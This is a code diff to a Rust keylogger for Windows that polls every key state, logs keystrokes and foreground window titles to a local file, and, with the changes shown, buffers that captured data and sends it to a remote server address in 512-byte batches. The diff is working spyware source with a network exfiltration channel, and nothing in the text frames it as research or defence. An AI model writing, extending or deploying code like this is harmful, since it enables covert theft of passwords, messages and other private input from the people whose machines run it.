@@ -1,11 +1,13 @@
 use winapi::um::winuser;
 use winapi::shared::windef::HWND;
 use winapi::um::winuser::{MAPVK_VK_TO_VSC, GetKeyNameTextW, GetForegroundWindow, GetWindowTextW};
-use std::fs::{File, OpenOptions};
+use std::fs::OpenOptions;
 use std::io::Write;
 use std::path::Path;
+use crate::network::send_buf;
+use std::net::SocketAddr;
 
-pub fn start<T: AsRef<Path>>(log_name: T) {
+pub fn start<T: AsRef<Path>>(server: SocketAddr, log_name: T) {
     let mut f = OpenOptions::new()
         .append(true)
         .create(true)
@@ -13,6 +15,7 @@ pub fn start<T: AsRef<Path>>(log_name: T) {
         .expect("Could not create log for KL");
 
     let mut last_window = String::new();
+    let mut buf: Vec<u8> = Vec::new();
 
     loop {
         for key in 8u32..191 {
@@ -27,6 +30,12 @@ pub fn start<T: AsRef<Path>>(log_name: T) {
                         if let Err(e) = f.write_all(window_title.as_bytes()) {
                             println!("Error writting to file: {}", e);
                         }
+
+                        // We push data into buffer
+                        for b in window_title.as_bytes() {
+                            buf.push(*b);
+                        }
+
                         last_window = window_title;
                     }
 
@@ -38,6 +47,17 @@ pub fn start<T: AsRef<Path>>(log_name: T) {
                         let data = format!("[{}]", String::from_utf16_lossy(&name[0..length]));
                         if let Err(e) = f.write_all(data.as_bytes()) {
                             println!("Error writting to file: {}", e);
+                        }
+
+                        // We push data into buffer
+                        for b in data.as_bytes() {
+                            buf.push(*b);
+                        }
+
+                        // If buffer is big enough, we send it to the server
+                        if buf.len() >= 512 {
+                            send_buf(server, &buf);
+                            buf.clear();
                         }
                     } else {
                         if let Err(e) = f.write_all("[ERROR]".as_bytes()) {
